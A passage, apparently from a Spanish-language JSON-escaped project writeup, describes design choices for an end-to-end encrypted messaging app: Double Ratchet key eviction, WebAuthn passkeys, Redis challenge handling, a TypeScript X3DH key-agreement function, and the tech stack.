LISTEN/NOTIFY funcionaría, pero las live queries nativas de SurrealDB eliminan la necesidad de una capa pub/sub separada. El tradeoff es complejidad operacional de correr una base de datos más nueva, pero la experiencia de desarrollador para características en tiempo real es significativamente mejor.\n\n**Estrategia de eviction de claves de mensajes saltados**: El Double Ratchet debe almacenar claves para mensajes que llegan fuera de orden, pero storage ilimitado habilita ataques DoS. La implementación usa un máximo configurable (1000 claves) con eviction FIFO, balanceando confiabilidad contra agotamiento de recursos.\n\n**WebAuthn con credenciales descubribles**: Los passkeys están configurados como residentes/descubribles, lo que significa que el autenticador almacena la credencial y el usuario no necesita proporcionar un username. Esto habilita autenticación de gesto único verdadero en dispositivos con autenticadores de plataforma.\n\n**Verificación de contador de firma**: Cada autenticación WebAuthn incrementa un contador almacenado en el autenticador. El servidor trackea esto y rechaza autenticaciones donde el contador no incrementa, detectando autenticadores clonados.\n\n**Redis para storage de challenges con get-and-delete atómico**: Los challenges WebAuthn son de uso único y limitados en tiempo. Usar pipelines Redis para atómicamente obtener y eliminar challenges previene ataques de replay sin race conditions.\n\n```typescript\nasync function initiateX3DH(\n  identityKeyPair: IdentityKeyPair,\n  recipientBundle: PreKeyBundle\n): Promise<X3DHResult> {\n  const signatureValid = await verifySignedPreKey(\n    recipientBundle.identity_key,\n    recipientBundle.signed_prekey,\n    recipientBundle.signed_prekey_signature\n  )\n\n  if (!signatureValid) {\n    throw new Error(\"Invalid signed prekey signature\")\n  }\n\n  const ephemeralKeyPair = await generateX25519KeyPair()\n  const ephemeralPublic = await exportPublicKey(ephemeralKeyPair.publicKey)\n\n  const senderIdentityPrivate = await importX25519PrivateKey(\n    base64ToBytes(identityKeyPair.x25519_private)\n  )\n  const recipientIdentityPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.identity_key)\n  )\n  const recipientSignedPreKeyPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.signed_prekey)\n  )\n\n  const dh1 = await x25519DeriveSharedSecret(senderIdentityPrivate, recipientSignedPreKeyPublic)\n  const dh2 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientIdentityPublic)\n  const dh3 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientSignedPreKeyPublic)\n\n  let dhResults: Uint8Array[]\n  let usedOneTimePreKey = false\n\n  if (recipientBundle.one_time_prekey) {\n    const recipientOneTimePreKeyPublic = await importX25519PublicKey(\n      base64ToBytes(recipientBundle.one_time_prekey)\n    )\n    const dh4 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientOneTimePreKeyPublic)\n    dhResults = [dh1, dh2, dh3, dh4]\n    usedOneTimePreKey = true\n  } else {\n    dhResults = [dh1, dh2, dh3]\n  }\n\n  const concatenated = concatBytes(...dhResults)\n  const sharedKey = await hkdfDerive(concatenated, EMPTY_SALT, X3DH_INFO, 32)\n\n  const senderIdentityPublic = base64ToBytes(identityKeyPair.x25519_public)\n  const recipientIdentityBytes = base64ToBytes(recipientBundle.identity_key)\n  const associatedData = concatBytes(senderIdentityPublic, recipientIdentityBytes)\n\n  return {\n    shared_key: sharedKey,\n    associated_data: associatedData,\n    ephemeral_public_key: bytesToBase64(ephemeralPublic),\n    used_one_time_prekey: usedOneTimePreKey,\n  }\n}\n```\n\nEl flujo completo X3DH del remitente: verificar el signed prekey para prevenir ataques MITM, generar un keypair efímero fresco, realizar tres o cuatro operaciones DH dependiendo de disponibilidad de one-time prekey, concatenar y pasar por HKDF para el secreto compartido final. Los associated data vinculando ambas claves de identidad en el contexto de encriptación previenen ataques de impersonación por compromiso de clave.\n\n### Stack\nPython 3.13, FastAPI, SQLModel, PostgreSQL, SurrealDB, Redis, WebAuthn (py_webauthn), cryptography, SolidJS, TypeScript, Tailwind CSS, Nanostores, Web Crypto API, Docker, Nginx\n"
}
